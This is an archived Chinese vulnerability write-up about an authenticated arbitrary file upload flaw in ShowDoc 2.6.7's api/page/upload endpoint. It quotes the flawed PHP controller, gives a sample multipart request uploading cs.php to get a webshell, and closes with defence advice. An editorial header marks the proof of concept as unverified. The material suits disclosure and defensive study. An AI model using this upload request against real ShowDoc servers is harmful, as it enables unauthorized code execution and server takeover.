---
source: "白阁文库 BaizeSec/bylibrary"
product: "ShowDoc2.6.7 api/page/upload"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "showdoc的api_page存在任意文件上传getshell"
prerequisites: "来源所述条件，未列明部分仍待核：登录、page_id存在且具有item项目权限；上传目录执行PHP"
side_effects: "未执行；本文需注意的操作影响：源码明显校验editormd-image-file但实际上传file，字段错配比没有任何过滤描述更精确；与uploadImg <>绕过不同权限/入口/根因，必须独立保留"
source_status: "unknown"
id: "vw-b7dd91959f3ee24abd862355"
entity_id: "ve-b7dd91959f3ee24abd862355"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：登录、page_id存在且具有item项目权限；上传目录执行PHP

- **事实待核（1）**：源码明显校验editormd-image-file但实际上传file，字段错配比没有任何过滤描述更精确。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：与uploadImg &lt;&gt;绕过不同权限/入口/根因，必须独立保留。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（3）**：HTTP只有multipart片段无headers/token且内容只是PNG头，未给PHP执行证明；master源码链接会漂移但版本tag明确。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# showdoc的api_page存在任意文件上传getshell

##  showdoc的api_page存在任意文件上传【需要登录】

### 背景

ShowDoc is a tool greatly applicable for an IT team to share documents online一个非常适合IT团队的在线API文档、技术文档工具

官网 ：https://www.showdoc.cc/ 

GitHub主页：https://github.com/star7th/showdoc

当前测试版本：[v2.6.7](https://github.com/star7th/showdoc/releases/tag/v2.6.7)

### 漏洞点

https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php#L258

```php
//上传附件
    public function upload(){
        $login_user = $this->checkLogin();
        $item_id = I("item_id/d") ? I("item_id/d") : 0 ;
        $page_id = I("page_id/d") ? I("page_id/d") : 0 ;
        $uploadFile = $_FILES['file'] ;
 
        if (!$page_id) {
            $this->sendError(10103,"请至少先保存一次页面内容");
            return;
        }
        if (!$this->checkItemPermn($login_user['uid'] , $item_id)) {
            $this->sendError(10103);
            return;
        }
        
        if (!$uploadFile) {
           return false;
        }
        
        if (strstr(strip_tags(strtolower($_FILES['editormd-image-file']['name'])), ".php") ) {
            return false;
        }

        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4145728000 ;// 设置附件上传大小
        $upload->rootPath = './../Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->uploadOne($uploadFile) ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = get_domain().__ROOT__.substr($upload->rootPath,1).$info['savepath'].$info['savename'] ;
          $insert = array(
            "uid" => $login_user['uid'],
            "item_id" => $item_id,
            "page_id" => $page_id,
            "display_name" => $uploadFile['name'],
            "file_type" => $uploadFile['type'],
            "file_size" => $uploadFile['size'],
            "real_url" => $url,
            "addtime" => time(),
            );
          $ret = D("UploadFile")->add($insert);

          echo json_encode(array("url"=>$url,"success"=>1));
        }

    }
```

相比 https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php#L212 的uploadImg() 有过滤,附件上传upload()没有任何过滤.可以直接上传shell。

burp的post数据大致如下：

```
POST /show/server/index.php?s=/api/page/upload HTTP/1.1

------WebKitFormBoundaryzOQywSoNbAALAwKn
Content-Disposition: form-data; name="page_id"

22
------WebKitFormBoundaryzOQywSoNbAALAwKn
Content-Disposition: form-data; name="item_id"

3
------WebKitFormBoundaryzOQywSoNbAALAwKn
Content-Disposition: form-data; name="file"; filename="cs.php"
Content-Type: image/png

PNG

------WebKitFormBoundaryzOQywSoNbAALAwKn--
```

### 防御

增加过滤，同时运维人员设置上传目录禁止执行，只允许写入读取，做好权限分配。

来源于土司：https://www.t00ls.net/thread-56340-1-1.html 由[Mrxn](https://github.com/Mr-xn) 整理 ，欢迎大家前往土司投稿注册发言。


---

> 来源：白阁文库 BaizeSec/bylibrary
